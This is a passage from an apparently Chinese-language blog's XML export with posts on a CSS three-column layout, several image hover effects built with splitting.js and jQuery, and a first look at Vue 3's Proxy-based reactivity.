class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/shuang.png" alt="My Pic"><br>设置中间元素的父元素的宽度为100%，很关键的设置浮动。通过子元素的margin流出两边的空白。得到下面的<br><img src="/images/shuang1.png" alt="My Pic"><br>设置左右两边元素float，以及margin-left:-100%;和margin-left：-200px;实现两边固定中间自适应<br><img src="/images/shuang.png" alt="My Pic"></p>
<h1 id="3-疑问"><a href="#3-疑问" class="headerlink" title="3.疑问"></a>3.疑问</h1><p>为什么margin-left为负的时候，那个块就浮动到第一层了。查了一些资料，left元素的设置了 margin-left:-100%;,按规范所述，浮动元素要尽可能向上浮动。100%就是container的宽度，container比left宽，因此left相当于不占空间，理论上可以放在和bd一行而不是另起一行，然后按规则就放上去了。right在右边是因为 margin-left:-200px;这值比 margin-left:-100%;小</p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>布局</tag>
      </tags>
  </entry>
  <entry>
    <title>几个酷炫的hover</title>
    <url>/2020/07/13/%E5%87%A0%E4%B8%AA%E9%85%B7%E7%82%AB%E7%9A%84hover/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天看到一篇博客介绍一些很酷炫的hover效果和相应的库。于是自己就去学习和了解了一下，自己动手试着还原一下。<br><a id="more"></a></p>
<h3 id="悬停图库切割合成大图"><a href="#悬停图库切割合成大图" class="headerlink" title="悬停图库切割合成大图"></a>悬停图库切割合成大图</h3><ul>
<li>先来看看最终的效果</li>
</ul>
<p><img src="/images/hover1.gif" alt="Image"></p>
<blockquote>
<p>效果就是当我们hover在图片上时，会分割的产生该图片变大之后的效果，分割效果主要是使用的splitting.js这个库去实现的，具体的代码如下：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://unpkg.com/splitting/dist/splitting.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://unpkg.com/splitting/dist/splitting-cells.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./index.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1067"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1061"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1057"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1052"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1043"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1055"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1036"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1037"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tiler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://picsum.photos/1000/600?image=1039"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://unpkg.com/splitting@1.0.0/dist/splitting.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    Splitting(&#123;</span></span><br><span class="line"><span class="javascript">     target: <span class="string">'.tiler'</span>,</span></span><br><span class="line"><span class="javascript">     by: <span class="string">'cells'</span>,</span></span><br><span class="line"><span class="undefined">     rows: 3,</span></span><br><span class="line"><span class="undefined">     columns: 3,</span></span><br><span class="line"><span class="javascript">     image: <span class="literal">true</span></span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.tiler</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  <span class="attribute">visibility</span>: hidden;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">33.3%</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tiler</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">visibility</span>: visible; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tiler</span> <span class="selector-class">.cell-grid</span> &#123;</span><br><span class="line">  <span class="attribute">background-position</span>: center center;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">10</span>;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">1000px</span>;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">600px</span>;</span><br><span class="line">  <span class="attribute">perspective</span>: <span class="number">30px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tiler</span> <span class="selector-class">.cell</span> &#123;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateZ</span>(-15px);</span><br><span class="line">  <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span><br><span class="line">  <span class="attribute">transition-property</span>: transform, opacity;</span><br><span class="line">  <span class="attribute">transition-duration</span>: <span class="number">0.5s</span>, <span class="number">0.4s</span>;</span><br><span class="line">  <span class="attribute">transition-timing-function</span>: <span class="built_in">cubic-bezier</span>(0.65, 0.01, 0.15, 1.33);</span><br><span class="line">  <span class="comment">/* The center character index */</span></span><br><span class="line">  <span class="attribute">--center-x</span>: <span class="built_in">calc</span>((var(--col-total) - <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">  <span class="attribute">--center-y</span>: <span class="built_in">calc</span>((var(--row-total) - <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">  <span class="comment">/* Offset from center, positive &amp; negative */</span></span><br><span class="line">  <span class="attribute">--offset-x</span>: <span class="built_in">calc</span>(var(--col-index) - <span class="built_in">var</span>(--center-x));</span><br><span class="line">  <span class="attribute">--offset-y</span>: <span class="built_in">calc</span>(var(--row-index) - <span class="built_in">var</span>(--center-y));</span><br><span class="line">  <span class="comment">/* Absolute distance from center, only positive */</span></span><br><span class="line">  <span class="attribute">--distance-x</span>: <span class="built_in">calc</span>(</span><br><span class="line">    (var(--offset-x) * <span class="built_in">var</span>(--offset-x)) / <span class="built_in">var</span>(--center-x)</span><br><span class="line">  );</span><br><span class="line">  <span class="comment">/* Absolute distance from center, only positive */</span></span><br><span class="line">  <span class="attribute">--distance-y</span>: <span class="built_in">calc</span>(</span><br><span class="line">    (var(--offset-y) * <span class="built_in">var</span>(--offset-y)) / <span class="built_in">var</span>(--center-y)</span><br><span class="line">  );</span><br><span class="line">  <span class="attribute">transition-delay</span>: <span class="built_in">calc</span>( 0.1s * var(--distance-y) + <span class="number">0.1s</span> * <span class="built_in">var</span>(--distance-x) ); &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tiler-overlay</span> &#123;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tiler</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.cell</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scale</span>(1);</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#000</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">800px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">2em</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*# sourceMappingURL=index.css.map */</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="https://splitting.js.org/guide.html" target="_blank" rel="noopener">官方文档</a></p>
</blockquote>
<h3 id="叠加运动悬停效应"><a href="#叠加运动悬停效应" class="headerlink" title="叠加运动悬停效应"></a>叠加运动悬停效应</h3><ul>
<li>同样的 我们还是先来看看最终的效果吧</li>
</ul>
<p><img src="/images/hover2.gif" alt="Image"></p>
<blockquote>
<p>效果是hover的时候图片后面会有相应的阴影形成3D堆叠的效果，一些动画效果主要是利用anime.js这个动画库去实现的。具体代码可见<a href="https://github.com/codrops/StackMotionHoverEffects/" target="_blank" rel="noopener">github</a></p>
</blockquote>
<h3 id="3D-缩略图悬停效果"><a href="#3D-缩略图悬停效果" class="headerlink" title="3D 缩略图悬停效果"></a>3D 缩略图悬停效果</h3><ul>
<li>同样的先来看看最终的效果吧<br><img src="/images/hover3.gif" alt="Image"></li>
</ul>
<blockquote>
<p>效果就是我们hover时图片的一边会卷起来形成一个3D的效果，同时展示一些其他的信息。主要是利用jquery+css来实现的，我们先来看看js部分的代码：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">( <span class="function"><span class="keyword">function</span>(<span class="params"> $ </span>) </span>&#123;</span><br><span class="line">	</span><br><span class="line">	$.fn.hoverfold = <span class="function"><span class="keyword">function</span>(<span class="params"> args </span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		</span><br><span class="line">			$( <span class="keyword">this</span> ).children( <span class="string">'.view'</span> ).each( <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			</span><br><span class="line">				<span class="keyword">var</span> $item 	= $( <span class="keyword">this</span> ),</span><br><span class="line">					img		= $item.children( <span class="string">'img'</span> ).attr( <span class="string">'src'</span> ),</span><br><span class="line">					struct	= <span class="string">'&lt;div class="slice s1"&gt;'</span>;</span><br><span class="line">						struct	+=<span class="string">'&lt;div class="slice s2"&gt;'</span>;</span><br><span class="line">							struct	+=<span class="string">'&lt;div class="slice s3"&gt;'</span>;</span><br><span class="line">								struct	+=<span class="string">'&lt;div class="slice s4"&gt;'</span>;</span><br><span class="line">									struct	+=<span class="string">'&lt;div class="slice s5"&gt;'</span>;</span><br><span class="line">									struct	+=<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">								struct	+=<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">							struct	+=<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">						struct	+=<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">					struct	+=<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">					</span><br><span class="line">				<span class="keyword">var</span> $struct = $( struct );</span><br><span class="line">				</span><br><span class="line">				$item.find( <span class="string">'img'</span> ).remove().end().append( $struct ).find( <span class="string">'div.slice'</span> ).css( <span class="string">'background-image'</span>, <span class="string">'url('</span> + img + <span class="string">')'</span> ).prepend( $( <span class="string">'&lt;span class="overlay" &gt;&lt;/span&gt;'</span> ) );</span><br><span class="line">				</span><br><span class="line">			&#125; );</span><br><span class="line">			</span><br><span class="line">		&#125;);</span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">&#125; )( jQuery );</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后直接选择相应的dom节点，调用这个方法<br>还有就是相关的css代码</p>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.view</span> &#123;</span><br><span class="line">	<span class="attribute">-webkit-perspective</span>: <span class="number">800px</span>;</span><br><span class="line">	<span class="attribute">-moz-perspective</span>: <span class="number">800px</span>;</span><br><span class="line">	<span class="attribute">-o-perspective</span>: <span class="number">800px</span>;</span><br><span class="line">	<span class="attribute">-ms-perspective</span>: <span class="number">800px</span>;</span><br><span class="line">	<span class="attribute">perspective</span>: <span class="number">800px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.view</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.s1</span>&#123;</span><br><span class="line">	<span class="attribute">-webkit-transition-delay</span>: <span class="number">200ms</span>;</span><br><span class="line">	<span class="attribute">-moz-transition-delay</span>: <span class="number">200ms</span>;</span><br><span class="line">	<span class="attribute">-o-transition-delay</span>: <span class="number">200ms</span>;</span><br><span class="line">	<span class="attribute">-ms-transition-delay</span>: <span class="number">200ms</span>;</span><br><span class="line">	<span class="attribute">transition-delay</span>: <span class="number">200ms</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="attribute">-webkit-transform</span>: <span class="built_in">rotate3d</span>(0,1,0,-3deg);</span><br><span class="line">	<span class="attribute">-moz-transform</span>: <span class="built_in">rotate3d</span>(0,1,0,-3deg);</span><br><span class="line">	<span class="attribute">-o-transform</span>: <span class="built_in">rotate3d</span>(0,1,0,-3deg);</span><br><span class="line">	<span class="attribute">-ms-transform</span>: <span class="built_in">rotate3d</span>(0,1,0,-3deg);</span><br><span class="line">	<span class="attribute">transform</span>: <span class="built_in">rotate3d</span>(0,1,0,-3deg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.view</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.s2</span>&#123;</span><br><span class="line">	<span class="attribute">-webkit-transition-delay</span>: <span class="number">150ms</span>;</span><br><span class="line">	<span class="attribute">-moz-transition-delay</span>: <span class="number">150ms</span>;</span><br><span class="line">	<span class="attribute">-o-transition-delay</span>: <span class="number">150ms</span>;</span><br><span class="line">	<span class="attribute">-ms-transition-delay</span>: <span class="number">150ms</span>;</span><br><span class="line">	<span class="attribute">transition-delay</span>: <span class="number">150ms</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-10deg);</span><br><span class="line">	<span class="attribute">-moz-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-10deg);</span><br><span class="line">	<span class="attribute">-o-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-10deg);</span><br><span class="line">	<span class="attribute">-ms-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-10deg);</span><br><span class="line">	<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-10deg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.view</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.s3</span>&#123;</span><br><span class="line">	<span class="attribute">-webkit-transition-delay</span>: <span class="number">100ms</span>;</span><br><span class="line">	<span class="attribute">-moz-transition-delay</span>: <span class="number">100ms</span>;</span><br><span class="line">	<span class="attribute">-o-transition-delay</span>: <span class="number">100ms</span>;</span><br><span class="line">	<span class="attribute">-ms-transition-delay</span>: <span class="number">100ms</span>;</span><br><span class="line">	<span class="attribute">transition-delay</span>: <span class="number">100ms</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-16deg);</span><br><span class="line">	<span class="attribute">-moz-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-16deg);</span><br><span class="line">	<span class="attribute">-o-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-16deg);</span><br><span class="line">	<span class="attribute">-ms-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-16deg);</span><br><span class="line">	<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-16deg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.view</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.s4</span>&#123;</span><br><span class="line">	<span class="attribute">-webkit-transition-delay</span>: <span class="number">50ms</span>;</span><br><span class="line">	<span class="attribute">-moz-transition-delay</span>: <span class="number">50ms</span>;</span><br><span class="line">	<span class="attribute">-o-transition-delay</span>: <span class="number">50ms</span>;</span><br><span class="line">	<span class="attribute">-ms-transition-delay</span>: <span class="number">50ms</span>;</span><br><span class="line">	<span class="attribute">transition-delay</span>: <span class="number">50ms</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-30deg);</span><br><span class="line">	<span class="attribute">-moz-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-30deg);</span><br><span class="line">	<span class="attribute">-o-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-30deg);</span><br><span class="line">	<span class="attribute">-ms-transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-30deg);</span><br><span class="line">	<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(59px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-30deg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.view</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.s5</span>&#123;</span><br><span class="line">	<span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(60px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-42deg);</span><br><span class="line">	<span class="attribute">-moz-transform</span>: <span class="built_in">translate3d</span>(60px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-42deg);</span><br><span class="line">	<span class="attribute">-o-transform</span>: <span class="built_in">translate3d</span>(60px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-42deg);</span><br><span class="line">	<span class="attribute">-ms-transform</span>: <span class="built_in">translate3d</span>(60px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-42deg);</span><br><span class="line">	<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(60px,0,0) <span class="built_in">rotate3d</span>(0,1,0,-42deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.view</span> <span class="selector-class">.s4</span> &gt; <span class="selector-class">.overlay</span> &#123;</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(right, rgba(0,0,0,0.3) <span class="number">0%</span>, <span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-webkit-linear-gradient</span>(right, rgba(0,0,0,0.3) <span class="number">0%</span>,<span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-o-linear-gradient</span>(right, rgba(0,0,0,0.3) <span class="number">0%</span>,<span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-ms-linear-gradient</span>(right, rgba(0,0,0,0.3) <span class="number">0%</span>,<span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(right, rgba(0,0,0,0.3) <span class="number">0%</span>,<span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.view</span> <span class="selector-class">.s5</span> &gt; <span class="selector-class">.overlay</span> &#123;</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(left, rgba(0,0,0,0.3) <span class="number">0%</span>, <span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-webkit-linear-gradient</span>(left, rgba(0,0,0,0.3) <span class="number">0%</span>,<span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-o-linear-gradient</span>(left, rgba(0,0,0,0.3) <span class="number">0%</span>,<span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-ms-linear-gradient</span>(left, rgba(0,0,0,0.3) <span class="number">0%</span>,<span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(left, rgba(0,0,0,0.3) <span class="number">0%</span>,<span class="built_in">rgba</span>(0,0,0,0) <span class="number">100%</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.view</span> <span class="selector-tag">div</span><span class="selector-class">.view-back</span>&#123;</span><br><span class="line">	<span class="attribute">background</span>: <span class="number">#0a0a0a</span>;</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(left, #0a0a0a 0%, #666666 100%);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-webkit-gradient</span>(linear, left top, right top, color-stop(0%,#0a0a0a), <span class="built_in">color-stop</span>(100%,#666666));</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-webkit-linear-gradient</span>(left, #0a0a0a 0%,#666666 100%);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-o-linear-gradient</span>(left, #0a0a0a 0%,#666666 100%);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">-ms-linear-gradient</span>(left, #0a0a0a 0%,#666666 100%);</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(left, #0a0a0a 0%,#666666 100%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以看到主要利用translate+rotate+transtion实现的3d效果</p>
</blockquote>
]]></content>
      <categories>
        <category>Css</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Css</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>初探VUE3</title>
    <url>/2020/01/10/%E5%88%9D%E6%8E%A2VUE3/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;VUE3的第一版也已经出来好几个月了，自己一直说要去看看，结果一直拖到了现在。目前依然是pre-alpha状态，但主要的架构改进、优化和新功能都已经完成，剩下的主要是完成一些Vue2现有功能的移植（尤大大原话）。下面就通过代码为大家初探一下Vue3：<br><a id="more"></a></p>
<h3 id="拉取源代码"><a href="#拉取源代码" class="headerlink" title="拉取源代码"></a>拉取源代码</h3><blockquote>
<p>GIthub源码：<a href="https://github.com/vuejs/vue-next" target="_blank" rel="noopener">vue-next</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull https://github.com/vuejs/vue-next.git</span><br><span class="line">cd vue-next</span><br></pre></td></tr></table></figure>
<h3 id="相对于之前的改变"><a href="#相对于之前的改变" class="headerlink" title="相对于之前的改变"></a>相对于之前的改变</h3><ul>
<li><p>双向数据绑定的实现（由Obejct.defineProperty-&gt;Proxy）</p>
<blockquote>
<p>这一点是众所周知的，使用代理解决了之前数组没实现的问题（使用之前的实现消耗太大）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="built_in">Proxy</span>(data, &#123;</span><br><span class="line">    get(obj, prop) &#123; ... &#125;,</span><br><span class="line">    set(obj, prop, newVal) &#123; ... &#125;,</span><br><span class="line">    deleteProperty() &#123;</span><br><span class="line">        <span class="comment">//invoked when property from source data object is deleted</span></span><br><span class="line">    &#125;&#125;)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>源码几乎都是使用TypeScript编写，ts的优势就不用多说了吧</p>
</li>
<li>重构了虚拟DOM</li>
<li>OptionApi =&gt; Composition API</li>
</ul>
